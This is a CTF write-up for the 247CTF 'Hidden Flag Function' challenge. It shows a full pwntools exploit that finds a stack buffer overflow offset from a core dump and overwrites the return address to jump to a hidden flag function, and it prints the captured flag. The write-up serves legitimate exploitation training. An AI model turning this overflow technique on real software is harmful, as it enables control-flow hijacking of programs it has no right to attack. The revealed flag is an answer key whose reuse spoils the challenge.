---
slug: hidden_flag_function
title: Hidden Flag Function
authors: [nguyen]
tags: [CTF, Binary Exploitation, 247ctf]
---

247CTF: Hidden Flag Function

<!--truncate-->

## The Challenge

This challenge can be found [here](https://247ctf.com/dashboard).

Given an application, the goal is to gain control of the application flow and gain access to the hidden flag function.

## Analysis

I plugged the provided program into Ghidra and looked at the function call graph. I started from _start() and then looked into the main function.

![Main function](/img/hidden_flag_function_main.png)

The function `chall` takes user input by using scanf and stores it into a 68 byte buffer before returning. After some more digging, I find a function called flag.

![Flag function](/img/hidden_flag_function_flag.png)

The scanf command from chall was a point of interest as I would have been able to overwrite the address stored in the return from function. I wanted the return to execute the flag function and get the flag.

I ran the `file` command on the executable and found that it was 32 bit little endian. It did not state that the program was a position independent executable. I needed to install i386 architecture as I could not run it natively on my ubuntu 64 bit system.

```bash
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
```

I also set core_pattern in /proc/sys/kernel to output coredumps to a file named core. This is needed in order to help with determining offsets within the executable.

## The Solve

```python
from pwn import *

exe = ELF("./hidden_flag_function")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

CYCLIC_BYTES = 1000

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('40b14b3351586e58.247ctf.com', 50175)

    else:
        io = process([exe.path])

    return io


def main():
    '''Return the flag.
    '''

    offset = get_offset()
    send_payload(offset)


def get_offset():
    '''Get the offset'''

    if args.get('REMOTE'):
        return 76

    with conn() as io:
        pat = cyclic(CYCLIC_BYTES, n=4)
        io.sendlineafter(b"What do you have to say?", pat)
        # Program will crash and output coredump
        io.wait()
        core = io.corefile
        offset_addr = core.fault_addr
        log.info(f"ADDR:{offset_addr}")

        offset = cyclic_find(offset_addr, n=4)
        log.info(f"OFFSET:{offset}")
        return offset


def send_payload(offset):
    '''Send offset payload with flag function address'''
    with conn() as io:
        flag_func = p32(exe.symbols['flag'], endian='little')
        log.info(f"{flag_func}")
        payload = fit({
            offset:flag_func
        })

        io.sendlineafter(b"What do you have to say?", payload)
        io.interactive()

if __name__ == '__main__':
    main()
```

First, I wanted to determine where the offset of scanf within the chall function was within the program. With the script above, I sent 1000 bytes using the cyclic pattern and attempted to crash the program. I parse the coredump for the address that caused the executable to crash. The executable will have crashed because chall's return address will have been overwritten. Chall's function stack is 76 bytes, consisting of the 68 byte array, the 4 byte FILE pointer, and the 4 byte stack pointer. The return address will be overwritten to be a subsequence of the pattern I sent with the usage of `cyclic`. Using `cyclic_find`, we find that the offset is 76 which matches what was expected.

Now that I had the offset, I needed to determine the flag function's address. This can be done by looking up the flag symbol with pwnlib.elf.elf. The address obtained is packed in little endian with the offset and sent.

Sending this payload to the server gets me the flag '247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}'.
